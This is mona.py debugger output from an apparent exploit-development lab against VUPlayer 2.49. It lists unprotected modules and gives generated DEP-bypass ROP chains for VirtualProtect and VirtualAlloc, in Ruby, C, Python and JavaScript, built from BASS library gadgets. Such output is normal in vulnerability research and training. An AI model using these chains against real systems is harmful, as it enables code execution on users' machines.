================================================================================
  Output generated by mona.py v2.0, rev 634 - Immunity Debugger
  Corelan Consulting bv - https://www.corelan.be
================================================================================
  OS : 10, release 10.0.19041
  Process being debugged : VUPlayer (pid 15448)
  Current mona arguments: rop -m "bass,basswma,bassmidi" -cp nonull
================================================================================
  2023-10-23 14:16:04
================================================================================
----------------------------------------------------------------------------------------------------------------------------------------------
 Module info :
----------------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
----------------------------------------------------------------------------------------------------------------------------------------------
 0x70150000 | 0x70178000 | 0x00028000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [WINMM.dll] (C:\Windows\SYSTEM32\WINMM.dll) 0x4140
 0x762c0000 | 0x7633b000 | 0x0007b000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [msvcp_win.dll] (C:\Windows\System32\msvcp_win.dll) 0x4140
 0x753e0000 | 0x754c8000 | 0x000e8000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [gdi32full.dll] (C:\Windows\System32\gdi32full.dll) 0x4140
 0x770a0000 | 0x7715f000 | 0x000bf000 | True   | True    | True  | True  |  False   | True   | 7.0.19041.3570 [MSVCRT.dll] (C:\Windows\System32\MSVCRT.dll) 0x4140
 0x772b0000 | 0x77454000 | 0x001a4000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll) 0x4140
 0x76540000 | 0x765b6000 | 0x00076000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.1 [sechost.dll] (C:\Windows\System32\sechost.dll) 0x4140
 0x6ba00000 | 0x6ba19000 | 0x00019000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [MSACM32.dll] (C:\Windows\SYSTEM32\MSACM32.dll) 0x4140
 0x10600000 | 0x1060f000 | 0x0000f000 | False  | False   | False | False |  False   | False  | 2.3 [BASSMIDI.dll] (D:\VulnTest\VUPlayer\BASSMIDI.dll) 0x0
 0x72770000 | 0x72bc5000 | 0x00455000 | True   | True    | True  | True  |  False   | True   | 11.00.19041.3570 [WININET.dll] (C:\Windows\SYSTEM32\WININET.dll) 0x4140
 0x76070000 | 0x76160000 | 0x000f0000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL) 0x4140
 0x766e0000 | 0x76705000 | 0x00025000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [IMM32.DLL] (C:\Windows\System32\IMM32.DLL) 0x4140
 0x765d0000 | 0x7664b000 | 0x0007b000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [advapi32.dll] (C:\Windows\System32\advapi32.dll) 0x4140
 0x6ba20000 | 0x6bb44000 | 0x00124000 | True   | True    | True  | True  |  False   | True   | 6.06.8063.0 [MFC42.DLL] (C:\Windows\SYSTEM32\MFC42.DLL) 0x4140
 0x75f10000 | 0x75ff3000 | 0x000e3000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [ole32.dll] (C:\Windows\System32\ole32.dll) 0x4140
 0x6bd30000 | 0x6bf40000 | 0x00210000 | True   | True    | True  | True  |  False   | True   | 6.10 [COMCTL32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.3570_none_a868611086700d20\COMCTL32.dll) 0x4140
 0x76340000 | 0x764dc000 | 0x0019c000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [USER32.dll] (C:\Windows\System32\USER32.dll) 0x4140
 0x76ff0000 | 0x7709f000 | 0x000af000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [comdlg32.dll] (C:\Windows\System32\comdlg32.dll) 0x4140
 0x754e0000 | 0x75760000 | 0x00280000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [combase.dll] (C:\Windows\System32\combase.dll) 0x4140
 0x77180000 | 0x772a0000 | 0x00120000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [ucrtbase.dll] (C:\Windows\System32\ucrtbase.dll) 0x4140
 0x76760000 | 0x767f6000 | 0x00096000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [OLEAUT32.dll] (C:\Windows\System32\OLEAUT32.dll) 0x4140
 0x76960000 | 0x76978000 | 0x00018000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [win32u.dll] (C:\Windows\System32\win32u.dll) 0x4540
 0x757f0000 | 0x75da7000 | 0x005b7000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [SHELL32.dll] (C:\Windows\System32\SHELL32.dll) 0x4140
 0x76f30000 | 0x76fef000 | 0x000bf000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll) 0x4140
 0x75760000 | 0x757e7000 | 0x00087000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [shcore.dll] (C:\Windows\System32\shcore.dll) 0x4140
 0x10100000 | 0x1010a000 | 0x0000a000 | False  | False   | False | False |  False   | False  | 2.3 [BASSWMA.dll] (D:\VulnTest\VUPlayer\BASSWMA.dll) 0x0
 0x76710000 | 0x76755000 | 0x00045000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [SHLWAPI.dll] (C:\Windows\System32\SHLWAPI.dll) 0x4140
 0x00400000 | 0x00592000 | 0x00192000 | False  | False   | False | False |  False   | False  | 2.49 [VUPlayer.exe] (D:\VulnTest\VUPlayer\VUPlayer.exe) 0x0
 0x751a0000 | 0x753da000 | 0x0023a000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll) 0x4140
 0x74ca0000 | 0x74ca8000 | 0x00008000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [VERSION.dll] (C:\Windows\SYSTEM32\VERSION.dll) 0x4140
 0x10000000 | 0x10041000 | 0x00041000 | False  | False   | False | False |  False   | False  | 2.3 [BASS.dll] (D:\VulnTest\VUPlayer\BASS.dll) 0x0
 0x75e30000 | 0x75e54000 | 0x00024000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [GDI32.dll] (C:\Windows\System32\GDI32.dll) 0x4540
 0x6b9e0000 | 0x6b9fd000 | 0x0001d000 | True   | True    | True  | True  |  False   | True   | 10.0.19041.3570 [winmmbase.dll] (C:\Windows\SYSTEM32\winmmbase.dll) 0x4140
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x100106e1,  # POP EBP # RETN [BASS.dll] 
      0x10022aa7,  # & jmp esp [BASS.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10038a6c,  # XCHG EAX,EDX # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x100163c7,  # POP ECX # RETN [BASS.dll] 
      0x101086a4,  # &Writable location [BASSWMA.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x10015fe7,  // POP EAX // RETN [BASS.dll] 
      0x1060e25c,  // ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x1001eaf1,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [BASS.dll] 
      0x10030950,  // XCHG EAX,ESI // RETN [BASS.dll] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x100106e1,  // POP EBP // RETN [BASS.dll] 
      0x10022aa7,  // & jmp esp [BASS.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x10015f82,  // POP EAX // RETN [BASS.dll] 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x10014db4,  // NEG EAX // RETN [BASS.dll] 
      0x10032f32,  // XCHG EAX,EBX // RETN 0x00 [BASS.dll] 
      //[---INFO:gadgets_to_set_edx:---]
      0x10015f82,  // POP EAX // RETN [BASS.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x10014db4,  // NEG EAX // RETN [BASS.dll] 
      0x10038a6c,  // XCHG EAX,EDX // RETN [BASS.dll] 
      //[---INFO:gadgets_to_set_ecx:---]
      0x100163c7,  // POP ECX // RETN [BASS.dll] 
      0x101086a4,  // &Writable location [BASSWMA.dll]
      //[---INFO:gadgets_to_set_edi:---]
      0x10603658,  // POP EDI // RETN [BASSMIDI.dll] 
      0x1001dc05,  // RETN (ROP NOP) [BASS.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x10015f82,  // POP EAX // RETN [BASS.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x1001d7a5,  // PUSHAD // RETN [BASS.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x100106e1,  # POP EBP # RETN [BASS.dll] 
      0x10022aa7,  # & jmp esp [BASS.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10038a6c,  # XCHG EAX,EDX # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x100163c7,  # POP ECX # RETN [BASS.dll] 
      0x101086a4,  # &Writable location [BASSWMA.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u5fe7%u1001" + // 0x10015fe7 : ,# POP EAX # RETN [BASS.dll] 
    "%ue25c%u1060" + // 0x1060e25c : ,# ptr to &VirtualProtect() [IAT BASSMIDI.dll]
    "%ueaf1%u1001" + // 0x1001eaf1 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
    "%u0950%u1003" + // 0x10030950 : ,# XCHG EAX,ESI # RETN [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u06e1%u1001" + // 0x100106e1 : ,# POP EBP # RETN [BASS.dll] 
    "%u2aa7%u1002" + // 0x10022aa7 : ,# & jmp esp [BASS.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u5f82%u1001" + // 0x10015f82 : ,# POP EAX # RETN [BASS.dll] 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%u4db4%u1001" + // 0x10014db4 : ,# NEG EAX # RETN [BASS.dll] 
    "%u2f32%u1003" + // 0x10032f32 : ,# XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u5f82%u1001" + // 0x10015f82 : ,# POP EAX # RETN [BASS.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u4db4%u1001" + // 0x10014db4 : ,# NEG EAX # RETN [BASS.dll] 
    "%u8a6c%u1003" + // 0x10038a6c : ,# XCHG EAX,EDX # RETN [BASS.dll] 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u63c7%u1001" + // 0x100163c7 : ,# POP ECX # RETN [BASS.dll] 
    "%u86a4%u1010" + // 0x101086a4 : ,# &Writable location [BASSWMA.dll]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u3658%u1060" + // 0x10603658 : ,# POP EDI # RETN [BASSMIDI.dll] 
    "%udc05%u1001" + // 0x1001dc05 : ,# RETN (ROP NOP) [BASS.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u5f82%u1001" + // 0x10015f82 : ,# POP EAX # RETN [BASS.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%ud7a5%u1001" + // 0x1001d7a5 : ,# PUSHAD # RETN [BASS.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x10010157,  # POP EBP # RETN [BASS.dll] 
      0x1010539f,  # & jmp esp [BASSWMA.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0xa1dfcf75,  # put delta into eax (-> put 0x00001000 into edx)
      0x1001bfa2,  # ADD EAX,5E20408B # RETN [BASS.dll] 
      0x10038a6c,  # XCHG EAX,EDX # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x101049ec,  # POP ECX # RETN [BASSWMA.dll] 
      0xffffffff,  #  
      0x10021194,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      0x10015fe0,  # INC ECX # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x1001dc04,  # POP EDI # RETN [BASS.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x00000000,  // [-] Unable to find API pointer -> eax
      0x1001eaf1,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [BASS.dll] 
      0x10030950,  // XCHG EAX,ESI // RETN [BASS.dll] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x10010157,  // POP EBP // RETN [BASS.dll] 
      0x1010539f,  // & jmp esp [BASSWMA.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x10015fe7,  // POP EAX // RETN [BASS.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x10014db4,  // NEG EAX // RETN [BASS.dll] 
      0x10032f32,  // XCHG EAX,EBX // RETN 0x00 [BASS.dll] 
      //[---INFO:gadgets_to_set_edx:---]
      0x10015f77,  // POP EAX // RETN [BASS.dll] 
      0xa1dfcf75,  // put delta into eax (-> put 0x00001000 into edx)
      0x1001bfa2,  // ADD EAX,5E20408B // RETN [BASS.dll] 
      0x10038a6c,  // XCHG EAX,EDX // RETN [BASS.dll] 
      //[---INFO:gadgets_to_set_ecx:---]
      0x101049ec,  // POP ECX // RETN [BASSWMA.dll] 
      0xffffffff,  //  
      0x10021194,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      0x10015fe0,  // INC ECX // RETN [BASS.dll] 
      //[---INFO:gadgets_to_set_edi:---]
      0x1001dc04,  // POP EDI // RETN [BASS.dll] 
      0x1001dc05,  // RETN (ROP NOP) [BASS.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x10015f82,  // POP EAX // RETN [BASS.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x1001d7a5,  // PUSHAD // RETN [BASS.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x10010157,  # POP EBP # RETN [BASS.dll] 
      0x1010539f,  # & jmp esp [BASSWMA.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0xa1dfcf75,  # put delta into eax (-> put 0x00001000 into edx)
